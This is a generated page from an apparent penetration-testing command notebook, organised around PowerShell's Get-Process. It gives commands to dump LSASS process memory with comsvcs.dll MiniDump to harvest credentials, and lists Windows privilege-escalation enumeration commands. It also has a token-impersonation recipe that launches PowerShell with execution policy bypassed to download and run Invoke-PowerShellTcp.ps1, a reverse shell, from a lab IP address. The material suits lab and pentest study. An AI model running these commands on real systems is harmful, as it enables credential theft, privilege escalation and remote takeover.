---
title: "Get-Process"
sidebarTitle: "Get-Process"
description: "Commands and examples collected from your Get-Process notes."
keywords: ["Get-Process"]
boost: 10
hideFooterPagination: true
---

{/* Generated from Commands/get-process.md. Edit the Markdown source, then run scripts/sync_site.py. */}

[Search this tool’s saved examples](/commands/notebook?tool=get-process) · [All tools](/index)

## Create the memory dump

**Notebook example**

```powershell
Get-Process lsass                       # PowerShell: PID is the Id field
rundll32 C:\windows\system32\comsvcs.dll, MiniDump <PID> C:\lsass.dmp full
```

Saved as written; may include lab values or terminal output.

[Find another command](/index) · [Ports](/enumeration/ports-cheatsheet)

## Notebook recipes

2 additional examples, grouped by task. Saved as written; prompts, output, original lab values and older syntax may be included.

<AccordionGroup>

<Accordion title="EoP - Processes Enumeration and Tasks">

### EoP - Processes Enumeration and Tasks

**Windows Privilege Escalation: Full Checklist**

```powershell
tasklist /v
net start
sc query
Get-Service
Get-Process
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize
```

</Accordion>

<Accordion title="RottenPotato (Token Impersonation)">

### RottenPotato (Token Impersonation)

**Windows Privilege Escalation: Full Checklist**

```powershell
Invoke-TokenManipulation -ImpersonateUser -Username "lab\domainadminuser"
Invoke-TokenManipulation -ImpersonateUser -Username "NT AUTHORITY\SYSTEM"
Get-Process wininit | Invoke-TokenManipulation -CreateProcess "Powershell.exe -nop -exec bypass -c \"IEX (New-Object Net.WebClient).DownloadString('http://10.7.253.6:82/Invoke-PowerShellTcp.ps1');\"};"
```

</Accordion>

</AccordionGroup>
